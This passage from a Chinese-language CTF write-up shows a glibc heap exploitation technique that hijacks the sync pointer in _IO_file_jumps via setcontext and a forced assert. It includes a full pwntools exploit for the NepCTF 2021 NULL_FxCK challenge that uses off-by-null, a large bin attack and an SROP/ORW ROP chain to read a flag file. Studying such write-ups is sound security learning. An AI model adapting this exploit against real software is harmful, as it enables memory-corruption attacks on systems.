        size_t SYNC = libc_base + 0x1E5520; // sync pointer in _IO_file_jumps
        setROP();
        *((size_t*)IO_helper + 0xA0/8) = ROP; // 设置rsp
        *((size_t*)IO_helper + 0xA8/8) = ret; // 设置rcx 即 程序setcontext运行完后会首先调用的指令地址
        *((size_t*)SYNC) = magic_gadget; // 设置fflush(stderr)中调用的指令地址
        // 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert
        size_t *top_size = (size_t*)((char*)malloc(0x10) + 0x18);
        *top_size = (*top_size)&0xFFE; // top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中,其中有个判断top_chunk的size中inuse位是否存在
        malloc(0x1000); // 触发assert
        _exit(-1);
    }
###  实际利用
以NepCTF 2021年中NULL_FxCK为例  
程序实现了一个简单的增删查改功能,在edit的时候存在一个`off by null`的漏洞利用,因为环境是GLIBC 2.32,其中tcache
chunk的fd进行了一个异或处理  
所以此前通过`tcache bin`、`fastbin` 以及 `large bin`共同进行的`fake chunk`的伪造不可行,下面则是
  * 仅large bin chunk的堆块伪造,并即可实现堆块重叠
  * 并large bin attack 任意写攻击TLS结构体中的存放tcache结构体指针的位置,从而可以伪造tcache bin结构体进行任意构造
  * 再通过上述demo任意写控制参数,从而在assert后即可进行栈迁移
    from pwn import*
    context.binary = './main'
    def menu(ch):
        p.sendlineafter('>> ',str(ch))
    def New(size,content):
        menu(1)
        p.sendlineafter('Size: ',str(size))
        p.sendafter('Content: ',content)
    def Modify(index,content):
        menu(2)
        p.sendlineafter('Index: ',str(index))
        p.sendafter('Content: ',content)
    def Show(index):
        menu(4)
        p.sendlineafter('Index: ',str(index))
    def Free(index):
        menu(3)
        p.sendlineafter('Index: ',str(index))
    libc = ELF('./libc-2.32.so')
    while True:
        p = remote('node2.hackingfor.fun',38734)
        try:
            New(0x2000,'FMYY')
            New(0x1000,'FMYY')
            New(0x2000 - 0x2F0 - 0x600,'FMYY')
            New(0x4F0,'FMYY') #3
            New(0x108,'FMYY')
            New(0x500,'FMYY') #5
            New(0x108,'FMYY') #6 - 7 -8
            New(0x108,'FMYY')
            New(0x108,'FMYY')
            New(0x510,'FMYY') #9
            New(0x108,'FMYY') 
            New(0x4F0,'FMYY') #11
            New(0x108,'FMYY') #12
            Free(3)
            Free(5)
            Free(9)
            New(0x2000,'FMYY')
            Free(3)
            New(0x500,'\x00'*8 + p64(0xE61)) # 3
            New(0x4F0,'\x00'*8+ '\x10\x00') # 5
            Free(11)
            New(0x800,'FMYY') # 9
            Free(9)
            New(0x510,'\x10\x00') #9
            New(0x4F0,'\x00'*0x20) #11
            Modify(10,'\x00'*0x100 + p64(0xE60))
            Free(11)
            New(0x4F0,'FMYY') # to split the unsorted bin chunk
            New(0x1000,'FMYY')
            Show(6)
            libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - 1648 - 0x10 - libc.sym['__malloc_hook']
            log.info('LIBC:\t' + hex(libc_base))
            Show(9)
            heap_base = u64(p.recv(6).ljust(8,'\x00')) - 0x49F0
            log.info('HEAP:\t' + hex(heap_base))
            ############################
            SROP_address = heap_base + 0x79F0
            magic = libc_base + 0x1EB538
            main_arena = libc_base + libc.sym['__malloc_hook'] + 0x10
            pop_rdi_ret = libc_base + 0x000000000002858F
            pop_rdx_r12 = libc_base + 0x0000000000114161
            pop_rsi_ret = libc_base + 0x000000000002AC3F
            pop_rax_ret = libc_base + 0x0000000000045580
            syscall_ret = libc_base + 0x00000000000611EA
            malloc_hook = libc_base + libc.sym['__malloc_hook']
            frame = SigreturnFrame()
            frame.rsp = heap_base + 0x7A90 + 0x58
            frame.rip = pop_rdi_ret + 1
            Open = libc_base + libc.symbols["open"]
            Read = libc_base + libc.symbols["read"]
            Write = libc_base + libc.symbols['write']
            orw  = ''
            orw += p64(pop_rax_ret) + p64(2)
            orw += p64(pop_rdi_ret)+p64(heap_base + 0x7B78)
            orw += p64(pop_rsi_ret)+p64(0)
            orw += p64(syscall_ret)
            orw += p64(pop_rdi_ret) + p64(3)
            orw += p64(pop_rdx_r12) + p64(0x100) + p64(0)
            orw += p64(pop_rsi_ret) + p64(heap_base + 0x10000)
            orw += p64(Read)
            orw += p64(pop_rdi_ret)+p64(1)
            orw += p64(Write)
            orw += './flag.txt\x00\x00'
            IO_helper_jumps = libc_base + 0x1E38C0
            ###################################
            New(0x130,'\x00'*0x108 + p64(0x4B1)) #14
            New(0x440,'FMYY') #15
            New(0x8B0,'\x00'*0x20 + p64(0x21)*8) #16
            New(0x430,'FMYY') #17
            New(0x108,'FMYY') #18
            Free(15)
            ######
            New(0x800,'FMYY')
            Free(15)
            ######
            Free(7)
            New(0x4A0,'\x00'*0x28 + p64(0x451) + p64(main_arena + 1120)*2 + p64(heap_base + 0x6650) + p64(magic - 0x20))
            Free(17)
            New(0x800,str(frame) + orw)
            Free(15)
            New(0x430,'FMYY')
            Free(7)
            New(0x4A0,'\x00'*0x30 + '\x01'*0x90 + p64(libc_base + 0x1E54C0 + 0x60)*0x10 + p64(libc_base + 0x1E48C0 + 0xA0)*0x10)
            Free(0)
            Free(1)
            New(0x108,p64(libc_base + libc.sym['setcontext'] + 61))
            New(0x208,str(frame)[0xA0:])
            menu(1)
            p.sendafter('Size:',str(0x428))
            break
        except:
            p.close()
    p.interactive()
## 总结
主要是相对于之前的两种方法而言,运用要简单需要,平常喜欢IO的一些知识,偶然发现的,侵删;